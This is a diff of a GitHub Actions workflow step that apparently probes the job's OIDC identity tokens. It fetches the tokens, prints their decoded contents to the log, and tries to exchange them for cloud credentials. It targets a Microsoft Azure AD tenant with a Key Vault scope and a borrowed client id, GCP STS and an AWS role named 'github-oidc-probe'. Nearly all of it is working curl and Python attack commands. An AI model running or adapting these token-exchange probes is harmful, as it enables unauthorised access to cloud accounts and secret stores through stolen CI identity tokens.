@@ -12,54 +12,31 @@ jobs:
         run: |
           set +e
           echo "=== ENV ==="
-          echo "URL_SET=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
-          echo "TOK_SET=${ACTIONS_ID_TOKEN_REQUEST_TOKEN:+yes}"
+          echo "URL_SET=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes} TOK_SET=${ACTIONS_ID_TOKEN_REQUEST_TOKEN:+yes}"
           echo "REPO=${GITHUB_REPOSITORY} REF=${GITHUB_REF} ACTOR=${GITHUB_ACTOR}"
-          AUD_DEFAULT="https://github.com/${GITHUB_REPOSITORY_OWNER}"
-          echo "=== DEFAULT AUD: $AUD_DEFAULT ==="
-          J1=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD_DEFAULT}" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
-          echo "JWT_DEFAULT_LEN=${#J1}"
-          echo "$J1" > /tmp/j1.txt
-          python3 -c '
-import base64,json,sys
-t=open("/tmp/j1.txt").read().strip()
-h,p,s=t.split(".")
-d=lambda x: base64.urlsafe_b64decode(x+"="*(-len(x)%4))
-print("HEADER",d(h).decode())
-print("PAYLOAD",json.dumps(json.loads(d(p)),indent=1))
-print("SIGLEN",len(s))
-'
+          AUD="https://github.com/${GITHUB_REPOSITORY_OWNER}"
+          echo "=== DEFAULT AUD: $AUD ==="
+          curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD}" -o /tmp/resp1.json
+          head -c 200 /tmp/resp1.json; echo
+          python3 -c "import json;open('/tmp/j1.txt','w').write(json.load(open('/tmp/resp1.json'))['value'])"
+          echo "JWT_DEFAULT_LEN=$(wc -c < /tmp/j1.txt)"
+          python3 -c "import base64,json;t=open('/tmp/j1.txt').read().strip();d=lambda x: base64.urlsafe_b64decode(x+'='*(-len(x)%4));print('HEADER',d(t.split('.')[0]).decode());print('PAYLOAD',json.dumps(json.loads(d(t.split('.')[1])),indent=1))"
           echo "=== AZURE AUD ==="
-          J2=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
-          echo "JWT_AZ_LEN=${#J2}"
-          echo "$J2" > /tmp/j2.txt
-          python3 -c '
-import base64,json
-t=open("/tmp/j2.txt").read().strip()
-p=t.split(".")[1]
-d=lambda x: base64.urlsafe_b64decode(x+"="*(-len(x)%4))
-print("AZ_PAYLOAD",json.dumps(json.loads(d(p)),indent=1))
-'
-          echo "=== AZURE AAD EXCHANGE (tenant 72f988bf, no client_id) ==="
-          curl -sS -m 30 -X POST "https://login.microsoftonline.com/72f988bf-86f1-41af-91ab-2d7cd011db47/oauth2/v2.0/token" \
-            --data-urlencode "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46" \
-            --data-urlencode "scope=https://vault.azure.net/.default" \
-            --data-urlencode "grant_type=client_credentials" \
-            --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
-            --data-urlencode "client_assertion=@/tmp/j2.txt" -o /tmp/az.json -w "HTTP=%{http_code}\n"
-          head -c 700 /tmp/az.json; echo
-          echo "=== GCP STS EXCHANGE (no provider path) ==="
-          curl -sS -m 30 -X POST "https://sts.googleapis.com/v1/token" \
-            -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
-            -d "audience=//iam.googleapis.com/projects/000000000000/locations/global/workloadIdentityPools/github/providers/github" \
-            -d "scope=https://www.googleapis.com/auth/cloud-platform" \
-            -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
-            -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
-            -d "subject_token=@/tmp/j1.txt" -o /tmp/gcp.json -w "HTTP=%{http_code}\n"
-          head -c 700 /tmp/gcp.json; echo
-          echo "=== AWS STS EXCHANGE (no role) ==="
-          curl -sS -m 30 "https://sts.amazonaws.com/?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&RoleArn=arn:aws:iam::111122223333:role/github-oidc-probe&RoleSessionName=probe&WebIdentityToken=@/tmp/j1.txt" -o /tmp/aws.xml -w "HTTP=%{http_code}\n"
-          head -c 700 /tmp/aws.xml; echo
+          curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" -o /tmp/resp2.json
+          python3 -c "import json;open('/tmp/j2.txt','w').write(json.load(open('/tmp/resp2.json'))['value'])"
+          echo "JWT_AZ_LEN=$(wc -c < /tmp/j2.txt)"
+          python3 -c "import base64,json;t=open('/tmp/j2.txt').read().strip();d=lambda x: base64.urlsafe_b64decode(x+'='*(-len(x)%4));print('AZ_PAYLOAD',json.dumps(json.loads(d(t.split('.')[1])),indent=1))"
+          echo "=== AZURE AAD EXCHANGE tenant 72f988bf ==="
+          J2=$(cat /tmp/j2.txt)
+          curl -sS -m 30 -X POST "https://login.microsoftonline.com/72f988bf-86f1-41af-91ab-2d7cd011db47/oauth2/v2.0/token" -d "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46" -d "scope=https://vault.azure.net/.default" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=$J2" -o /tmp/az.json -w "HTTP=%{http_code}\n"
+          head -c 800 /tmp/az.json; echo
+          echo "=== GCP STS EXCHANGE ==="
+          J1=$(cat /tmp/j1.txt)
+          curl -sS -m 30 -X POST "https://sts.googleapis.com/v1/token" -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" -d "audience=//iam.googleapis.com/projects/000000000000/locations/global/workloadIdentityPools/github/providers/github" -d "scope=https://www.googleapis.com/auth/cloud-platform" -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" -d "subject_token=$J1" -o /tmp/gcp.json -w "HTTP=%{http_code}\n"
+          head -c 800 /tmp/gcp.json; echo
+          echo "=== AWS STS EXCHANGE ==="
+          curl -sS -m 30 "https://sts.amazonaws.com/?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&RoleArn=arn:aws:iam::111122223333:role/github-oidc-probe&RoleSessionName=probe&WebIdentityToken=$J1" -o /tmp/aws.xml -w "HTTP=%{http_code}\n"
+          head -c 800 /tmp/aws.xml; echo
           echo "=== AZURE TENANT DISCOVERY ==="
           curl -sS -m 30 "https://login.microsoftonline.com/72f988bf-86f1-41af-91ab-2d7cd011db47/v2.0/.well-known/openid-configuration" -o /tmp/aztd.json -w "HTTP=%{http_code}\n"
           head -c 300 /tmp/aztd.json; echo
